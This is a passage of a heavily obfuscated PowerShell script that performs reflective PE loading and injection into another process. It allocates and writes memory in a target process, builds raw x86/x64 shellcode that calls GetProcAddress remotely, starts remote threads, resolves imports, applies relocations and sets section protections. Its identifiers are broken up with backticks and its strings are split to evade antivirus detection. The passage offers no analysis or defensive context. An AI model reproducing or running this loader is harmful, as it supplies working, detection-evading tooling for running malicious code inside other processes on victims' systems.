                ${R`T`HLE}  = ICRT -ProLEv ${R`Ph} -SAYS1 ${RS`c`AdDR} -W32F ${w`32f}
                ${RE`sU`lt} =  ${W3`2F}."wAITfor`SIngleobJ`E`cT"."i`NvOKe"(${rT`hle}, 20000 )
                if (  ${R`e`SulT} -ne 0  ) {
                    throw ""
                }
			
				
                [IntPtr]${rv`MEm}  =  [System.Runtime.InteropServices.Marshal]::"allO`c`hg`lOBAL"( ${PO`iN`T`eRSz}  )
                ${rESu`lt}   =   ${W`32F}."r`eaDPR`O`cES`sMemory"."I`NvOkE"(${R`PH}, ${lo`ADLIB`RarY`ARE`TMeM}, ${R`VMEM}, [UIntPtr][UInt64]${p`o`INteRSZ}, [Ref]${n`Bw}  )
                if ( ${re`sUlT} -eq ${f`Alse}) {
                    throw ""
                }
                [IntPtr]${dlLAD`dr`e`sS}  =   [System.Runtime.InteropServices.Marshal]::"P`TrtoSTr`UC`TURE"(${rV`m`Em}, [Type][IntPtr] )

                ${W`32F}."v`IrTUaL`Fr`e`eEX"."i`N`VOke"(${r`Ph}, ${l`oadl`I`BrA`RYA`RE`TMeM}, [UIntPtr][UInt64]0, ${W3`2C}."mE`M_relea`sE"  ) > ${NU`LL}
                ${W`32f}."VIr`TUALfRE`E`eX"."iNv`OkE"( ${r`PH}, ${R`S`cAdDR}, [UIntPtr][UInt64]0, ${W3`2c}."ME`M_`RElEAse"  ) > ${n`Ull}
            }
            else {
                [IntPtr]${rTH`LE} =   ICRT -ProLEv ${R`ph} -SAYS1 ${l`oAD`LIbRAR`yAAD`dR} -ArgumentPtr ${r`impOrTDL`l`pAtHPTr} -W32F ${w`32f}
                ${RE`Su`Lt}   =  ${w3`2F}."WAitfORsingL`E`oB`J`ecT"."iNV`oKe"(  ${Rt`hLe}, 20000)
                if ( ${r`e`SUlT} -ne 0 ) {
                    throw ""
                }
			
                [Int32]${E`xit`cOde} = 0
                ${rEs`U`LT}   = ${W`32f}."G`EtEXiT`C`ODEThreAd"."invO`KE"(${RTh`Le}, [Ref]${ExIT`CodE} )
                if (  (${Re`s`Ult} -eq 0 ) -or (${eXIt`coDe} -eq 0 ) ) {
                    throw ""
                }
			
                [IntPtr]${D`l`L`AddRess}  =  [IntPtr]${E`Xi`TcOdE}
            }
		
            ${W3`2F}."V`IrTUA`LFrEeex"."INv`OKe"( ${r`Ph}, ${RiMpor`T`d`Llp`AthPTR}, [UIntPtr][UInt64]0, ${W3`2C}."M`Em_Re`Le`AsE"  ) > ${n`ULl}
		
            return ${DLLaD`d`Re`Ss}
        }
	
	
        Function GRpAa {
            Param(
                [Parameter(  POSiTiOn   = 0, MaNDATOrY =   ${tr`Ue}  )]
                [IntPtr]
                ${r`ph},
		
                [Parameter( pOSitioN  =   1, maNdAtory =  ${tr`Ue})]
                [IntPtr]
                ${rEMoTEd`l`lha`N`dle},
		
                [Parameter(POsitIoN  = 2, maNDAToRY   =  ${tr`UE})]
                [String]
                ${F`U`Ncti`oNNAMe}
              )

            ${P`oiNtER`sz} =   [System.Runtime.InteropServices.Marshal]::"sIz`E`OF"( [Type][IntPtr]  )
            ${f`U`Nc`TIONNAM`eptr}  =   [System.Runtime.InteropServices.Marshal]::"STRin`GTOHglobal`A`NsI"( ${FUNCT`I`OnNamE})
		
			
            ${FuNcTIOnNa`M`e`SI`ze}  =   [UIntPtr][UInt64](  [UInt64]${fUnCt`IOnN`A`me}."LEN`GTH"   +   1 )
            ${r`FU`NCN`AMepTr} = ${W`32F}."V`I`RTualal`lOCEx"."in`Vo`kE"(  ${r`pH}, [IntPtr]::"Z`erO", ${fU`N`CTioNnaMes`IZe}, ${w`32C}."mEM`_Co`MMiT" -bor ${w3`2C}."m`E`m_rEse`Rve", ${w`32c}."PAgE`_ReadwRI`TE"  )
            if ( ${Rfun`c`NAMEptr} -eq [IntPtr]::"Ze`Ro"  ) {
                throw ""
            }

            [UIntPtr]${n`Bw}  = [UIntPtr]::"zE`Ro"
            ${su`C`CESs} =  ${W3`2F}."WRI`TEpro`Ce`sSmeMorY"."IN`VoKe"( ${r`ph}, ${RFU`N`c`NaM`ePTr}, ${F`Un`ctiOnna`m`eptR}, ${FUN`C`TIonN`Am`es`IZe}, [Ref]${N`Bw}  )
            [System.Runtime.InteropServices.Marshal]::"F`ReehGl`O`BAl"(${FuNCT`iOnNA`MePTr})
            if ( ${SUccE`Ss} -eq ${F`A`LSE}) {
                throw ""
            }
            if (  ${fUNct`IONn`AmeSi`zE} -ne ${n`BW} ) {
                throw ""
            }
		
			
            ${k`32h} = ${W`32F}."ge`TMODu`lEha`NdlE"."I`N`VOKE"(  (  'k' +'e'+ 'rnel32.dl'  +'l'  )  )
            ${GPaaD`Dr}  = ${W3`2f}."Getp`ROCa`DDr`Ess"."iN`VoKe"( ${k3`2h}, ( 'Ge' +  'tPro'+'cAd'  +'dress'  )) 

		
			
            ${G`p`ArET`MEM}   =  ${W`32F}."V`iRTU`ALaL`loCEX"."I`NvoKE"(  ${r`ph}, [IntPtr]::"Z`eRO", [UInt64][UInt64]${p`oI`NTEr`Sz}, ${W3`2c}."m`EM_`cOMMIt" -bor ${w`32C}."mEm_r`e`S`ErVe", ${W`32C}."PaG`e_r`EAd`Write")
            if (  ${gPAr`et`MEm} -eq [IntPtr]::"zE`RO" ) {
                throw ""
            }
		
		
			
			
			
            [Byte[]]${g`p`ASC}  = @()
            if (  ${P`EI}."pe`64biT" -eq ${TR`UE}) {
                ${Gp`Asc1}   =   @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9  )
                ${gp`A`sc2} =  @(0x48, 0xba)
                ${Gpas`C3} =  @(0x48, 0xb8  )
                ${G`Pasc4}  =   @(0xff, 0xd0, 0x48, 0xb9  )
                ${g`P`Asc5}   =  @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3 )
            }
            else {
                ${gPA`S`C1}   =   @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8 )
                ${gP`A`sC2}   =   @(0xb9)
                ${gPA`s`C3}   = @(0x51, 0x50, 0xb8 )
                ${G`PA`sC4}  =   @(0xff, 0xd0, 0xb9 )
                ${G`pASC5}  =  @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3  )
            }
            ${ScL`eN`GtH}  = ${G`Pa`sC1}."LEn`gTh" + ${g`pasC2}."l`eng`TH"   +  ${GpA`s`C3}."l`EnGTH"  +   ${gP`Asc4}."L`Eng`TH" +   ${GPa`s`C5}."LE`NgTh"  +  ( ${P`OiNt`erSz} * 4  )
            ${s`m} = [System.Runtime.InteropServices.Marshal]::"aL`LOc`HglobAL"(  ${S`C`leNgth}  )
            ${sMOr`i`GI`NAl}  =   ${s`m}
		
            WBTM -Bytes ${Gpa`s`C1} -MADS ${SM}
            ${S`m} =  ASIAU ${s`M} (  ${GpA`Sc1}."L`ENGth")
            [System.Runtime.InteropServices.Marshal]::"s`TruCTU`R`et`OPtR"( ${REMOt`EdL`lh`A`Ndle}, ${s`m}, ${fA`lSE} )
            ${S`M}  = ASIAU ${S`m} (${PO`IntE`RsZ})
            WBTM -Bytes ${gp`As`c2} -MADS ${S`M}
            ${Sm}  = ASIAU ${Sm} ( ${G`p`AsC2}."le`NG`TH")
            [System.Runtime.InteropServices.Marshal]::"S`TR`U`cTUREtoptR"( ${RfuN`cnAme`PTR}, ${Sm}, ${fAl`se} )
            ${s`m}   =   ASIAU ${S`M} (  ${p`o`inTErsz})
            WBTM -Bytes ${G`Pa`sc3} -MADS ${s`M}
            ${SM} =  ASIAU ${s`M} (  ${Gpas`C3}."len`g`TH" )
            [System.Runtime.InteropServices.Marshal]::"STr`UCTUR`etOPTR"(  ${gp`AaDDR}, ${Sm}, ${Fa`l`sE})
            ${S`M}   =   ASIAU ${sM} (  ${Poin`TE`R`SZ})
            WBTM -Bytes ${g`P`ASC4} -MADS ${SM}
            ${sm}  = ASIAU ${S`m} (  ${GPa`s`C4}."L`EngTh")
            [System.Runtime.InteropServices.Marshal]::"Struct`U`R`eToptr"(  ${GPa`R`ETMeM}, ${sm}, ${fa`lse}  )
            ${S`m}   =  ASIAU ${sM} (${PoiN`Te`Rsz})
            WBTM -Bytes ${gP`AS`C5} -MADS ${Sm}
            ${s`m}   =  ASIAU ${SM} (${GPA`s`C5}."l`eng`Th")
		
            ${rScA`dDR}  =  ${W3`2f}."Vi`RTu`ALA`llOceX"."iN`VoKe"(  ${R`pH}, [IntPtr]::"z`ERo", [UIntPtr][UInt64]${sclE`Ng`TH}, ${W`32C}."me`m_Co`MMit" -bor ${w3`2c}."ME`M_RESe`R`VE", ${W3`2c}."P`Age_eX`e`cut`E_Re`ADWr`Ite")
            if (  ${r`sC`ADdR} -eq [IntPtr]::"Ze`Ro") {
                throw ""
            }
		
            ${su`cC`eSS}  =   ${w`32F}."wRitEPRocEs`SMe`mO`Ry"."IN`V`OkE"( ${r`PH}, ${R`SC`Addr}, ${sMo`RigI`NAL}, [UIntPtr][UInt64]${sCl`engTH}, [Ref]${n`Bw} )
            if (  ( ${sU`CC`esS} -eq ${Fa`LsE}) -or ( [UInt64]${n`BW} -ne [UInt64]${S`cL`eNGth} ) ) {
                throw ""
            }
		
            ${Rth`LE}   =   ICRT -ProLEv ${r`ph} -SAYS1 ${rSC`AD`dR} -W32F ${w`32F}
            ${RESU`lt}  =   ${W`32F}."WAIt`FOrs`ING`lEobj`ect"."I`NVokE"( ${Rt`hlE}, 20000  )
            if (${rE`suLT} -ne 0) {
                throw ""
            }
		
			
            [IntPtr]${R`V`Mem}   = [System.Runtime.InteropServices.Marshal]::"AlLo`Chg`LOBaL"(${P`oinTe`RSZ}  )
            ${Re`SU`Lt} = ${w3`2f}."r`eadprOces`S`m`Em`orY"."in`VokE"(${R`Ph}, ${gP`AReT`MeM}, ${R`VMEm}, [UIntPtr][UInt64]${poIN`Te`RsZ}, [Ref]${N`BW})
            if (  (${rEs`UlT} -eq ${F`A`lSE}  ) -or (${N`Bw} -eq 0  )  ) {
                throw ""
            }
            [IntPtr]${prOC`ADDr`eSs} =   [System.Runtime.InteropServices.Marshal]::"ptr`T`O`structURe"( ${rVM`em}, [Type][IntPtr])

            ${W3`2F}."vI`RtuAlFrEE`Ex"."In`V`OkE"(${r`ph}, ${r`sc`Addr}, [UIntPtr][UInt64]0, ${W3`2C}."Me`m_reL`eaSe" ) > ${nU`LL}
            ${w3`2F}."v`iR`Tualfr`E`EEX"."I`NVOkE"( ${R`PH}, ${r`FUNcNA`m`EptR}, [UIntPtr][UInt64]0, ${W3`2c}."MeM_`REL`E`ASe" ) > ${n`UlL}
            ${w`32F}."VIrtU`Al`F`Reeex"."iN`VOKe"(  ${R`PH}, ${g`pArEtm`eM}, [UIntPtr][UInt64]0, ${w`32c}."mEm_`RE`LE`AsE"  ) > ${N`ULL}
		
            return ${pr`oCadd`REss}
        }


        Function KoPsEc {
            Param( 
                [Parameter( pOSitiON  =   0, maNdatOry =   ${TR`UE}  )]
                [Byte[]]
                ${P`N`EbitES},
		
                [Parameter(  posiTion  = 1, mandATory  =  ${tr`Ue}  )]
                [System.Object]
                ${P`Ei},
		
                [Parameter(PosITiON =  2, maNDatOry  = ${TR`Ue} )]
                [System.Object]
                ${w3`2f},
		
                [Parameter(  posiTiON  = 3, MandAtorY  = ${TR`UE} )]
                [System.Object]
                ${W3`2T}
              )
		
            for (   ${I}   = 0 ;  ${I} -lt ${P`eI}."I`maG`e`_nT_heADERS"."f`ILEHea`DER"."NUMB`Er`OfSe`cTIOnS"  ; ${i}++ ) {
                [IntPtr]${s`HeD`ERpTr} =  [IntPtr]( ASIAU ([Int64]${P`Ei}."S`ECTI`oNH`E`AdeRPtr" ) ( ${I} * [System.Runtime.InteropServices.Marshal]::"SI`Ze`oF"([Type]${w3`2t}."IM`AGe_sEcTi`ON_`Hea`DER" )) )
                ${SHeD`eR} = [System.Runtime.InteropServices.Marshal]::"ptRto`stR`U`ctUrE"( ${SheDE`R`Ptr}, [Type]${W3`2t}."I`ma`Ge_SEC`TiOn_HE`A`DeR"  )
		
				
                [IntPtr]${sec`T`i`oNDESTAdDR}   =  [IntPtr](  ASIAU (  [Int64]${P`Ei}."P`EhA`NDle") ([Int64]${shed`eR}."VI`RtUAlA`DD`REss"  )  )
			
				
				
				
				
                ${SO`RD}  =   ${sHe`d`er}."siz`EOFr`AW`DA`TA"

                if (${SH`eDER}."PoInte`R`TORaW`D`A`Ta" -eq 0  ) {
                    ${S`ORD}  =  0
                }
			
                if (${s`oRD} -gt ${s`h`EdeR}."VI`RT`UaL`sIzE" ) {
                    ${s`ORD}  = ${sHED`eR}."VIr`T`UAlsizE"
                }
			
                if (  ${so`RD} -gt 0 ) {
                    TMRV -DebugString ( 'KOPSEC::M'  +'a'  + 'rsh'+'alCopy') -PEI ${p`EI} -SAYS1 ${SEc`T`iOn`destaDdR} -Size ${SO`Rd} > ${nu`LL}
                    [System.Runtime.InteropServices.Marshal]::"C`oPy"(  ${PN`e`BiteS}, [Int32]${SHe`der}."PoIn`TerT`O`R`AWdaTA", ${S`e`CTiON`DestAd`DR}, ${s`orD}  )
                }
		
				
                if (${S`hE`dER}."S`IzEOF`RAW`D`Ata" -lt ${she`DeR}."VIrtUaLs`I`ZE") {
                    ${Di`FFe`RE`NCE} =  ${Sh`e`DEr}."VIRT`UALsi`ze" - ${sO`RD}
                    [IntPtr]${s`Ay`S1}   =   [IntPtr](ASIAU ( [Int64]${Sec`Ti`OND`e`StadDR} ) ( [Int64]${SO`Rd} ) )
                    TMRV -DebugString ('KOPS' + 'EC::Me' +  'm'+  'set' ) -PEI ${P`Ei} -SAYS1 ${S`Ays1} -Size ${D`if`FeRen`CE} > ${nU`Ll}
                    ${W3`2F}."m`EMs`Et"."invo`kE"(${sa`YS1}, 0, [IntPtr]${D`iFfER`EN`ce}) > ${n`UlL}
                }
            }
        }


        Function uPDatE-MADSEs {
            Param(
                [Parameter( PosiTiOn  =  0, MandaTORY   =  ${T`RuE} )]
                [System.Object]
                ${p`eI},
		
                [Parameter(pOsitIoN  =   1, MANDatORy  =  ${TR`UE})]
                [Int64]
                ${O`IB},
		
                [Parameter(pOSiTiOn = 2, mANdatORY   =  ${t`RUE})]
                [System.Object]
                ${w3`2c},
		
                [Parameter( pOsition =  3, maNdAtORy =  ${T`RUE})]
                [System.Object]
                ${w`32T}
             )
		
            [Int64]${B`dC}   =  0
            ${bA`dC}  =   ${tR`Ue} 
            [UInt32]${ib`Rs} = [System.Runtime.InteropServices.Marshal]::"siZE`Of"([Type]${w`32T}."IMAG`e_`Ba`Se_REl`OC`AtiOn" )
		
			
            if ((  ${o`ib} -eq [Int64]${p`ei}."e`FF`Ec`TIv`EpehA`NdLE"  ) `
                    -or (${P`eI}."image`_nt_he`ADE`Rs"."op`T`iOnA`lhEADER"."BA`SeRE`LOc`AT`ionT`AblE"."s`IzE" -eq 0  )) {
                return
            }


            elseif ( (  CV1GTV2AU (  ${o`iB}  ) (  ${p`ei}."efFeCtIVEP`eha`Nd`LE" )) -eq ${t`RUe}) {
                ${b`DC}   =  SSIAU(  ${O`ib}) (${p`EI}."e`FFectIV`E`PEhanDLE"  )
                ${BA`dC}   =   ${F`Alse}
            }
            elseif ( (  CV1GTV2AU ( ${p`EI}."eFfECt`iV`EP`eHandle") (  ${O`iB}) ) -eq ${t`RUe}) {
                ${b`dC} =   SSIAU( ${P`ei}."effe`C`TI`Ve`pEHaNdLe") ( ${o`Ib})
            }
		
			
            [IntPtr]${b`AsERelO`cPtR} = [IntPtr](  ASIAU ( [Int64]${P`eI}."pEHa`N`dle") (  [Int64]${P`ei}."i`m`AGE_n`T_heAD`ERs"."opT`IoNalh`EaD`ER"."B`As`erELo`cationTab`lE"."VIrTuA`L`ADdRE`SS"  ))
            while (${t`RUe}) {
				
                ${b`RtbE}  =   [System.Runtime.InteropServices.Marshal]::"pTRTOSt`Ructu`RE"(  ${bA`seRElOC`P`Tr}, [Type]${W`32T}."im`A`gE_b`ASe_rel`OCATi`ON" )

                if (${B`RtbE}."SIzEOfBl`o`ck" -eq 0) {
                    break
                }

                [IntPtr]${ME`mAB}  =  [IntPtr](  ASIAU ( [Int64]${p`eI}."Peha`N`dLE"  ) ( [Int64]${B`R`TbE}."vIR`TualA`D`drESS"))
                ${Nr`LM} =  (${b`R`Tbe}."s`Ize`OfbLo`ck" - ${I`BRS}) / 2

				
                for (  ${i} =   0 ;   ${I} -lt ${N`RLm}  ;  ${i}++) {
					
                    ${rEl`OC`A`TIoNi`NFOpTr} = [IntPtr](  ASIAU ( [IntPtr]${baS`erE`loc`pTr} ) ( [Int64]${IB`Rs}   + (  2 * ${I}  )  ))
                    [UInt16]${R`e`loCA`TIO`NiNFO} =  [System.Runtime.InteropServices.Marshal]::"PTrt`O`Stru`CT`Ure"(${R`elo`Cat`IoninfOP`Tr}, [Type][UInt16]  )

					
                    [UInt16]${r`Os}   =   ${r`el`OCAtioNInfo} -band 0x0FFF
                    [UInt16]${R`TPE} =  ${Relo`cAti`O`NIN`FO} -band 0xF000
                    for ( ${J}  =   0; ${J} -lt 12  ; ${J}++  ) {
                        ${rT`pe}   =  [Math]::"FLo`oR"(  ${R`Tpe} / 2  )
                    }

					
					
					
                    if (  (${R`TpE} -eq ${w`32C}."IMAGe_`REL`_Based`_HI`GhLoW"  ) `
                            -or (${RT`PE} -eq ${w`32C}."imagE_`Rel_b`AsEd_DI`R64")) {			
						
                        [IntPtr]${F`inAlAD`DR} =  [IntPtr]( ASIAU (  [Int64]${M`E`mab}) ([Int64]${R`os}  ))
                        [IntPtr]${CUrR`AD`Dr}   =  [System.Runtime.InteropServices.Marshal]::"PT`Rtos`TRUCT`UrE"(  ${f`in`A`laDDr}, [Type][IntPtr] )
		
                        if (  ${BA`DC} -eq ${T`Rue}  ) {
                            [IntPtr]${cURR`A`DDR}  =  [IntPtr](ASIAU ([Int64]${CU`RrAD`dR} ) (${b`dC}  ) )
                        }
                        else {
                            [IntPtr]${C`UrR`AD`DR} = [IntPtr](  SSIAU(  [Int64]${currAd`Dr}  ) ( ${B`dc} ))
                        }				

                        [System.Runtime.InteropServices.Marshal]::"StrUctUR`E`TOP`Tr"(${C`UrRAd`Dr}, ${fi`N`A`lAdDr}, ${FA`L`sE} ) > ${N`ULL}
                    }
                    elseif ( ${rT`PE} -ne ${W3`2C}."I`mag`e_`REl_BASEd_ab`sO`l`UTE" ) {
						
                        throw ""
                    }
                }
			
                ${bASER`e`LOcp`Tr}  =  [IntPtr](  ASIAU (  [Int64]${B`ASereL`OCPtr} ) (  [Int64]${b`RTBE}."S`iz`EoFb`lOCK"  ) )
            }
        }


        Function idIs {
    Param(
        [Parameter(  PoSITION   =  0, MAndAToRy  = ${TR`Ue} )]
        [System.Object]
        ${p`eI},

        [Parameter(PosiTioN  =   1, mAnDAtoRy   =  ${Tr`Ue}  )]
        [System.Object]
        ${W`32F},

        [Parameter(PosItioN = 2, mAndAToRY =  ${T`RUe})]
        [System.Object]
        ${w3`2T},

        [Parameter(poSItIoN = 3, maNdATOrY  =  ${TR`Ue})]
        [System.Object]
        ${W3`2C},

        [Parameter(  pOSitIoN   = 4, mAnDAtOrY   =  ${Fa`LsE})]
        [IntPtr]
        ${R`Ph}
    )

    ${R`lg} = ${fA`lse}
    if (${p`ei}."p`ehA`NdlE" -ne ${P`Ei}."Ef`FEcT`iVepe`H`ANdle"  ) {
        ${r`Lg}  =  ${T`RUe}
    }

    if (${p`EI}."i`MaG`E_Nt_HEa`D`erS"."OP`TIO`Na`LHE`AdeR"."impo`R`TtaBLE"."S`Ize" -gt 0 ) {
        [IntPtr]${I`dO`PtR} =   ASIAU (  [Int64]${P`eI}."PEhA`Ndle") ( [Int64]${P`EI}."IMAg`e`_Nt_`hea`Ders"."OPtiONA`l`HEADeR"."IMPoRt`Ta`BLe"."vIrt`Ual`ADD`Ress"  )

        while (  ${tr`Ue} ) {
            ${i`DO}   =  [System.Runtime.InteropServices.Marshal]::"pTRTos`Tr`UctURE"(  ${Ido`PtR}, [Type]${w3`2T}."iMaGE_iMp`o`RT_DEs`Cri`PtOR"  )

            if (${I`Do}."ChARACt`ErI`sT`iCS" -eq 0 -and ${I`dO}."firs`TTHu`Nk" -eq 0 -and ${i`Do}."fO`RwAr`d`ErChA`iN" -eq 0 -and ${I`do}."n`AmE" -eq 0 -and ${I`dO}."tIm`EdATEs`TA`Mp" -eq 0  ) {
                break
            }

            ${ID`La}  =  [IntPtr]::"ZE`RO"
            ${Ip`AmsPtr}   =  ( ASIAU ( [Int64]${P`eI}."pEhAN`DLE" ) ([Int64]${I`do}."N`AMe"))
            ${IP`Ams}  =   [System.Runtime.InteropServices.Marshal]::"p`Tr`TosT`RINg`AnSI"(  ${IPamsP`TR} )

            if (  ${R`lG} -eq ${Tr`UE}) {
                ${id`lA}  =  IDRP -RemoteProcHandle ${R`Ph} -ImportDllPathPtr ${i`Pam`S`PTr}
            }
            else {
                ${Id`la} = ${W`32F}."lOAdl`iBr`ARY"."In`Voke"(${Ipa`MS})
            }

            if (  ( ${i`dla} -eq ${nu`lL}) -or ( ${I`dla} -eq [IntPtr]::"Ze`RO" )  ) {
                throw ""
            }

            [IntPtr]${Th`Un`kReF} =  ASIAU ( ${P`EI}."peha`N`Dle") (${I`do}."F`irstTh`UNK"  )
            [IntPtr]${O`RI`gINAltHUN`K`REF} =  ASIAU ( ${P`eI}."pEh`AND`LE") (${i`Do}."C`HaRaCTE`R`iSTIcs") 
            [IntPtr]${orIG`inalTh`U`NKrEFv`AL}  =  [System.Runtime.InteropServices.Marshal]::"pTrto`s`TRucTu`Re"(${Ori`GiNALt`HuNkR`Ef}, [Type][IntPtr])

            while (${ORI`GIN`ALtHuN`KREFV`Al} -ne [IntPtr]::"z`Ero"  ) {
                ${PR`ms`sa}   =   ''

                [IntPtr]${neWtH`UnKr`Ef}   = [IntPtr]::"ze`Ro"
                if (  [Int64]${ORigiNa`lT`hu`NK`REfvAl} -lt 0) {
                    ${pR`ms`sa}   =   [Int64]${ORIgINAl`ThU`Nkr`EF`VaL} -band 0xffff 
                }
                else {
                    [IntPtr]${pOS`Ms}   =   ASIAU (${p`eI}."PeHa`NdlE" ) (${oriGINalt`HUnK`R`EFVal} )
                    ${Pos`mS}  =  ASIAU ${po`smS} ([System.Runtime.InteropServices.Marshal]::"s`izeof"(  [Type][UInt16] ) )
                    ${prm`ssa}   =  [System.Runtime.InteropServices.Marshal]::"ptRtOSTRi`NG`AN`Si"( ${Po`smS})
                }

                if (${r`lg} -eq ${TR`UE} ) {
                    [IntPtr]${neW`ThU`NkREf}  = GRPAA -RemoteProcHandle ${R`ph} -RemoteDllHandle ${id`La} -FunctionName ${Pr`MsSA}
                }
                else {
                    if (${P`Rm`SSa} -is [string]  ) {
                        [IntPtr]${NeW`T`hunKrEf} =  ${W3`2F}."G`E`Tp`RO`CaddresS"."IN`Voke"( ${id`lA}, ${pR`MssA}  )
                    }
                    else {
                        [IntPtr]${ne`wtHU`Nk`ReF} = ${w3`2f}."Ge`TprOcaDD`ResS`OrdIn`Al"."i`NVoke"(${I`Dla}, ${PRM`sSa}  )
                    }
                }

                if (  ${NewTH`U`N`Kref} -eq ${N`ULL} -or ${Ne`WT`H`UNkrEF} -eq [IntPtr]::"Ze`RO"  ) {
                    throw ""
                }

                [System.Runtime.InteropServices.Marshal]::"S`Tr`UcTuRET`oP`TR"(  ${N`ewTHu`N`krEf}, ${t`hun`KREF}, ${f`A`LsE}  )

                ${ThU`NKr`ef}  =   ASIAU (  [Int64]${tHU`Nk`ReF} ) (  [System.Runtime.InteropServices.Marshal]::"SIZ`eoF"([Type][IntPtr])  )
                [IntPtr]${ORiGi`N`Alth`U`N`KrEF}   =   ASIAU ([Int64]${OR`iGin`Alt`h`UNKreF}) (  [System.Runtime.InteropServices.Marshal]::"SizE`Of"( [Type][IntPtr]))
                [IntPtr]${oRig`I`NAlThU`Nkre`FVal} =  [System.Runtime.InteropServices.Marshal]::"PTR`To`sTr`UcTurE"(  ${oRI`GiN`Al`THu`NKr`EF}, [Type][IntPtr]  )
            }

            ${i`D`Optr} =   ASIAU (${ido`ptr}  ) (  [System.Runtime.InteropServices.Marshal]::"Size`oF"([Type]${w3`2T}."iMa`g`E_I`mpor`T_`DEs`CrIPT`oR"  )  )
        }
    }
}


        Function GvPv {
    Param(
        [Parameter(  POSItIoN  = 0, MaNdatoRY  = ${Tr`Ue})]
        [UInt32]
        ${L`os`Pd}
    )

    ${mB`s`Ju} =  0x0
    if ( (${L`OSPd} -band ${w3`2c}."ima`gE`_Scn_`mem_`e`xECuTe" ) -gt 0 ) {
        if ( (  ${L`OS`PD} -band ${w3`2C}."IMA`gE_`SCn`_mem`_rEAd") -gt 0 ) {
            if (  (  ${LOs`Pd} -band ${W`32c}."I`Ma`GE_`scn_m`Em_WRI`Te"  ) -gt 0) {
                ${M`BSJU}  =   ${w`32C}."Page_E`Xe`CuT`E_`REad`WR`ItE"
            }
            else {
                ${M`B`sjU}   =   ${w`32C}."PAG`e`_EXEC`Ute_`REaD"
            }
        }
        else {
            if (  ( ${l`o`Spd} -band ${w3`2C}."IMaGe_SCn_M`em_`wR`ite") -gt 0 ) {
                ${M`BS`Ju}   = ${w3`2c}."PA`Ge`_exeCute_W`RIte`COpy"
            }
            else {
                ${M`BSJu}  =  ${W3`2c}."PAgE`_exEcu`TE"
            }
        }
    }
    else {
        if ((${LO`S`Pd} -band ${W`32C}."IM`AGE_s`cN_M`eM`_r`EAD"  ) -gt 0) {
            if (  (${L`O`spD} -band ${w`32c}."IMAgE_sC`N`_`m`EM_W`Rite") -gt 0) {
                ${mb`sJU} =   ${W`32c}."pa`GE`_rEaDw`Ri`Te"
            }
            else {
                ${MB`sju}  =   ${W`32c}."PaGE_R`Ea`doNLy"
            }
        }
        else {
            if ( (  ${LO`SpD} -band ${w`32c}."IMag`E_sCn`_MeM`_`wrI`TE" ) -gt 0) {
                ${m`B`sjU} = ${w`32C}."page`_wRI`TEcO`PY"
            }
            else {
                ${MB`sjU}  =  ${w`32c}."pa`ge`_nO`ACcess"
            }
        }
    }

    if (  (${lO`SPD} -band ${w`32C}."imA`g`e_sC`N`_Mem_NOt_ca`c`heD") -gt 0  ) {
        ${m`B`sjU}   = ${M`Bs`JU} -bor ${w`32c}."PA`G`e_noC`ACHe"
    }

    return ${M`BS`Ju}
}


Function UMpfS {
    Param(  
        [Parameter( PoSItIoN   =  0, MAndAToRY =   ${TR`Ue} )]
        [System.Object]
        ${P`ei},

        [Parameter(POSItIoN   = 1, MandATOrY  =  ${T`Rue})]
        [System.Object]
        ${w3`2F},

        [Parameter(PoSiTIOn  =  2, mAndaToRy  = ${t`RuE} )]
        [System.Object]
        ${w`32C},

        [Parameter(  PoSItIOn   =  3, mandatoRY  = ${tr`UE})]
        [System.Object]
        ${W`32t}
    )

    for ( ${I}  = 0 ; ${i} -lt ${p`ei}."imAgE_Nt_`H`eADE`Rs"."F`iLeHE`ADER"."NumbErOF`SECtIo`NS";   ${I}++) {
        [IntPtr]${S`H`ed`eRpTr}   =   [IntPtr](ASIAU ([Int64]${p`Ei}."Sect`ionH`EaDE`Rp`TR") ( ${i} * [System.Runtime.InteropServices.Marshal]::"size`of"(  [Type]${W3`2t}."imA`gE_`sECti`ON_h`EADer"  )  ) )
        ${S`HeD`eR}   =  [System.Runtime.InteropServices.Marshal]::"p`TrTOs`TRUctURE"(  ${SHe`D`erPTR}, [Type]${W3`2t}."i`MA`gE`_Se`CtIOn_hEaDer")
        [IntPtr]${P`RSF}   = ASIAU (  ${P`eI}."Pe`hAn`Dle") (${ShE`Der}."V`I`RtuAlADDrEsS"  )

        [UInt32]${p`RF}   =   GVPV ${SHEd`er}."CHA`RaC`TE`R`ISTICs"
        [UInt32]${Hs`La}  =  ${sHE`DeR}."vI`Rtua`Ls`Ize"

        [UInt32]${O`pF}  =  0
        TMRV -DebugString (  'UMP'+  'FS::V'  +  'i'+'r' + 'tu' +'alPro' +'tect') -PEI ${p`EI} -SAYS1 ${P`RSF} -Size ${H`SlA} > ${N`ULl}
        ${s`UCC`EsS} =  ${W`32F}."vIRTuaLpro`T`ECT"."IN`VO`Ke"(  ${pR`Sf}, ${h`sLA}, ${P`Rf}, [Ref]${o`pF})
        if ( ${s`Ucc`esS} -eq ${FA`l`Se} ) {
            throw ""
        }
    }
}

	
		
		
        Function Uefc {
    Param( 
        [Parameter( pOSitIon   = 0, maNdaTORY  = ${t`RuE}  )]
        [System.Object]
        ${P`EI},

        [Parameter(  PoSiTiOn = 1, mAndaToRy =   ${tR`Ue}  )]
        [System.Object]
        ${W3`2f},

        [Parameter( posItiON  =  2, manDatORY  =   ${t`RuE} )]
        [System.Object]
        ${W3`2C},

        [Parameter(PositIon   =  3, maNDatORY  = ${Tr`UE} )]
        [String]
        ${E`AGTS},

        [Parameter( posiTiON   =   4, maNDAToRy  =   ${t`RuE} )]
        [IntPtr]
        ${eD`BP}
    )

    ${reTU`RnA`R`Ray} =  @( )

    ${P`oInT`ErsZ} =  [System.Runtime.InteropServices.Marshal]::"s`I`ZEOF"( [Type][IntPtr])
    [UInt32]${O`Pf} =  0

    [IntPtr]${K3`2h}   = ${W`32F}."gETm`oD`U`L`eHanDle"."inV`okE"( (  'Ke'  + 'rne'+  'l32.dll') )
    if (  ${k`32H} -eq [IntPtr]::"Z`ERo") {
        throw ""
    }

    [IntPtr]${K`Bha}   =   ${W`32F}."GETmOdULeh`An`dlE"."inV`OkE"( (  'Ke'  + 'r'  + 'ne' +'lBase.dll')  )
    if (  ${k`BHa} -eq [IntPtr]::"ze`Ro" ) {
        throw ""
    }

